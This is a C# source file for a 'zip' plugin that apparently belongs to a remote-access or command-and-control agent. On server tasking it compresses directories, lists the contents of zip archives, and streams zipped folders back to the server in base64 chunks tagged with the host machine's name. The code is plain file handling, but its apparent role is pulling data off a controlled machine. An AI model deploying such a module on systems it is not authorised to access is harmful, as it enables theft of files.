using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO.Compression;
using System.Text;
using System.Text.Json;
using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class DownloadJsonResponse
    {
        public int currentChunk { get; set; }
        public int totalChunks { get; set; }
        public string file_id { get; set; } = string.Empty;

        public string ToJson()
        {
            return JsonSerializer.Serialize(this);
        }
    }

    public class Plugin : IModule, IFileModule
    {
        public string Name => "zip";
        private IDataBroker messageManager { get; set; }
        private IServiceConfig agentConfig { get; set; }
        private Dictionary<string, Stream> _streams = new Dictionary<string, Stream>();
        private ConcurrentDictionary<string, ServerDownloadJob> downloadJobs { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
            this.agentConfig = context.Config;
            this.downloadJobs = new();
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            ZipArgs args = JsonSerializer.Deserialize<ZipArgs>(job.task.parameters);

            if (args is null)
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Failed to deserialize arguments",
                    completed = true,
                    status = "error"
                });
                return;
            }

            switch (args.action)
            {
                case "compress":
                    await ExecuteCompress(job, args);
                    break;
                case "download":
                    await ExecuteDownload(job, args);
                    break;
                case "inspect":
                    await ExecuteInspect(job, args);
                    break;
                default:
                    messageManager.AddTaskResponse(new TaskResponse()
                    {
                        task_id = job.task.id,
                        user_output = $"Unknown action: {args.action}",
                        completed = true,
                        status = "error"
                    });
                    break;
            }
        }

        private async Task ExecuteCompress(ServerJob job, ZipArgs args)
        {
            if (string.IsNullOrEmpty(args.source) || string.IsNullOrEmpty(args.destination))
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "source and destination are required for compress",
                    completed = true,
                    status = "error"
                });
                return;
            }

            if (!Directory.Exists(args.source))
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Source folder doesn't exist",
                    completed = true,
                    status = "error"
                });
                return;
            }

            if (File.Exists(args.destination))
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Destination already exists",
                    completed = true,
                    status = "error",
                });
                return;
            }

            DebugLog.Log($"{Name} creating zip '{args.source}' -> '{args.destination}' [{job.task.id}]");
            ZipFile.CreateFromDirectory(args.source, args.destination, CompressionLevel.SmallestSize, false);
            messageManager.AddTaskResponse(new TaskResponse()
            {
                task_id = job.task.id,
                user_output = $"Zip written to {args.destination}.",
                completed = true
            });
        }

        private async Task ExecuteDownload(ServerJob job, ZipArgs args)
        {
            if (string.IsNullOrEmpty(args.source))
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "source is required for download",
                    completed = true,
                    status = "error"
                });
                return;
            }

            if (!string.IsNullOrEmpty(args.destination))
            {
                args.write = true;
            }

            var dirInfo = new DirectoryInfo(args.source);

            if (!dirInfo.Exists)
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Directory doesn't exist.",
                    completed = true,
                    status = "error"
                });
                return;
            }

            long directorySize = GetFolderSize(dirInfo);

            if (args.write)
            {
                DebugLog.Log($"{Name} writing zip to disk '{args.destination}' [{job.task.id}]");
                ZipFile.CreateFromDirectory(args.source, args.destination, CompressionLevel.SmallestSize, false);
                Stream fs = File.OpenRead(args.destination);
                _streams.Add(job.task.id, fs);
                await StartSendFile(job, agentConfig.chunk_size, fs.Length, dirInfo.Name);
            }
            else
            {
                DebugLog.Log($"{Name} in-memory zip, size={directorySize} [{job.task.id}]");
                if (directorySize > 1073741824 && !args.force)
                {
                    messageManager.AddTaskResponse(new TaskResponse()
                    {
                        task_id = job.task.id,
                        user_output = $"This zip is gonna be pretty big, the folder is ({directorySize}) bytes, consider specifying write=true to flush to disk first, or specify force=true to specify force it to be in memory",
                        completed = true,
                        status = "error"
                    });
                    return;
                }
                MemoryStream str = new MemoryStream();
                ZipFile.CreateFromDirectory(args.source, str, CompressionLevel.SmallestSize, false);
                _streams.Add(job.task.id, str);
                await StartSendFile(job, agentConfig.chunk_size, str.Length, dirInfo.Name);
            }
        }

        private async Task ExecuteInspect(ServerJob job, ZipArgs args)
        {
            if (string.IsNullOrEmpty(args.path))
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "path is required for inspect",
                    completed = true,
                    status = "error"
                });
                return;
            }

            FileInfo fInfo = new FileInfo(args.path);
            if (!fInfo.Exists)
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = $"Zipfile does not exist: {args.path}",
                    task_id = job.task.id,
                });
                return;
            }

            if (args.path.EndsWith("zip", StringComparison.InvariantCultureIgnoreCase))
            {
                DebugLog.Log($"{Name} inspecting '{args.path}' [{job.task.id}]");
                ExtractZipContents(args.path, job.task.id);
            }
            else
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = "Only zip supported right now.",
                    task_id = job.task.id,
                });
            }
        }

        private void ExtractZipContents(string path, string task_id)
        {
            StringBuilder output = new StringBuilder();
            try
            {
                using (ZipArchive archive = ZipFile.OpenRead(path))
                {
                    foreach (ZipArchiveEntry entry in archive.Entries)
                    {
                        output.AppendLine($"{entry.Length}\t {entry.FullName}");
                    }
                }
            }
            catch (Exception e)
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = e.ToString(),
                    task_id = task_id,
                    status = "error"
                });
                return;
            }

            messageManager.AddTaskResponse(new TaskResponse
            {
                completed = true,
                user_output = FormatFileData(output.ToString()),
                task_id = task_id,
            });
        }

        private string FormatFileData(string data)
        {
            string[] lines = data.Trim().Split('\n');
            var structuredData = new List<(int Size, string Path)>();

            foreach (var line in lines)
            {
                int firstSpaceIndex = line.IndexOf('\t');
                if (firstSpaceIndex == -1) continue;

                string sizePart = line.Substring(0, firstSpaceIndex).Trim();
                string pathPart = line.Substring(firstSpaceIndex).Trim();

                if (int.TryParse(sizePart, out int size))
                {
                    structuredData.Add((size, pathPart));
                }
            }

            int maxSizeWidth = structuredData.Count > 0
                ? structuredData.Max(entry => entry.Size.ToString().Length)
                : 0;
            int maxPathWidth = structuredData.Count > 0
                ? structuredData.Max(entry => entry.Path.Length)
                : 0;

            var table = new List<string>
            {
                $"{"Size".PadLeft(maxSizeWidth)}  {"Path".PadRight(maxPathWidth)}",
                new string('-', maxSizeWidth + 2 + maxPathWidth)
            };

            foreach (var entry in structuredData)
            {
                string size = entry.Size.ToString().PadLeft(maxSizeWidth);
                string path = entry.Path.PadRight(maxPathWidth);
                table.Add($"{size}  {path}");
            }

            return string.Join(Environment.NewLine, table);
        }

        private long GetFolderSize(DirectoryInfo directoryInfo)
        {
            long totalSize = 0;
            FileInfo[] files = directoryInfo.GetFiles("*", SearchOption.AllDirectories);
            foreach (FileInfo file in files)
            {
                totalSize += file.Length;
            }
            return totalSize;
        }

        private async Task StartSendFile(
            ServerJob server_job, int chunk_size, long stream_size, string file_name)
        {
            ServerDownloadJob job = new ServerDownloadJob(server_job, "", chunk_size);
            job.total_chunks = GetTotalChunks(stream_size, chunk_size);
            job.path = $"{file_name}.zip";
            downloadJobs.GetOrAdd(job.task.id, job);

            messageManager.AddTaskResponse(new DownloadTaskResponse
            {
                user_output = string.Empty,
                download = new DownloadTaskResponseData()
                {
                    total_chunks = job.total_chunks,
                    full_path = job.path,
                    chunk_num = 0,
                    chunk_data = string.Empty,
                    is_screenshot = false,
                    host = Environment.MachineName,
                },
                status = "processed",
                task_id = job.task.id,
                completed = false,
            }.ToJson());
        }

        public async Task HandleNextMessage(ServerTaskingResponse response)
        {
            DebugLog.Log($"{Name} HandleNextMessage [{response.task_id}]");
            ServerDownloadJob downloadJob = GetJob(response.task_id);

            if (response.status != "success" || downloadJob.cancellationtokensource.IsCancellationRequested)
            {
                string message = response.status != "success"
                    ? "An error occurred while communicating with the server."
                    : "Cancelled by user.";
                messageManager.WriteLine(message, response.task_id, true, "error");
                CompleteDownloadJob(response.task_id);
                return;
            }

            if (string.IsNullOrEmpty(downloadJob.file_id))
            {
                downloadJob.file_id = response.file_id;
            }

            downloadJob.chunk_num++;

            bool isCompleted = downloadJob.chunk_num == downloadJob.total_chunks;

            var downloadResponse = new DownloadTaskResponse
            {
                task_id = response.task_id,
                user_output = new DownloadJsonResponse
                {
                    currentChunk = downloadJob.chunk_num,
                    totalChunks = downloadJob.total_chunks,
                    file_id = downloadJob.file_id,
                }.ToJson(),
                download = new DownloadTaskResponseData
                {
                    is_screenshot = false,
                    host = string.Empty,
                    file_id = downloadJob.file_id,
                    full_path = downloadJob.path,
                    chunk_num = downloadJob.chunk_num,
                },
                status = isCompleted ? string.Empty : $"Processed {downloadJob.chunk_num}/{downloadJob.total_chunks}",
                completed = isCompleted,
            };

            if (TryHandleNextChunk(downloadJob, out var chunk))
            {
                downloadResponse.download.chunk_data = chunk;
            }
            else
            {
                downloadResponse.user_output = chunk;
                downloadResponse.status = "error";
                downloadResponse.download.chunk_data = string.Empty;
                downloadResponse.completed = true;
            }

            messageManager.AddTaskResponse(downloadResponse.ToJson());

            if (downloadResponse.completed)
            {
                DebugLog.Log($"{Name} download complete [{response.task_id}]");
                CompleteDownloadJob(response.task_id);
            }
        }

        private int GetTotalChunks(long size, int chunk_size)
        {
            try
            {
                return (int)Math.Ceiling((double)size / chunk_size);
            }
            catch
            {
                return 0;
            }
        }

        public void CompleteDownloadJob(string task_id)
        {
            downloadJobs.Remove(task_id, out _);

            if (_streams.ContainsKey(task_id) && _streams[task_id] is not null)
            {
                _streams[task_id].Close();
                _streams[task_id].Dispose();
                _streams.Remove(task_id);
            }
            this.messageManager.CompleteJob(task_id);
        }

        public bool TryHandleNextChunk(ServerDownloadJob job, out string chunk)
        {
            if (!_streams.ContainsKey(job.task.id))
            {
                chunk = "No stream available.";
                return false;
            }

            try
            {
                long totalBytesRead = job.chunk_size * (job.chunk_num - 1);
                byte[] buffer = new byte[job.chunk_size];

                if (_streams[job.task.id].Length - totalBytesRead < job.chunk_size)
                {
                    job.complete = true;
                    buffer = new byte[_streams[job.task.id].Length - job.bytesRead];
                }

                _streams[job.task.id].Seek(job.bytesRead, SeekOrigin.Begin);
                job.bytesRead += _streams[job.task.id].Read(buffer, 0, buffer.Length);
                chunk = Misc.Base64Encode(buffer);
                return true;
            }
            catch (Exception e)
            {
                job.complete = true;
                chunk = e.ToString();
                return false;
            }
        }

        public ServerDownloadJob GetJob(string task_id)
        {
            return downloadJobs[task_id];
        }
    }
}
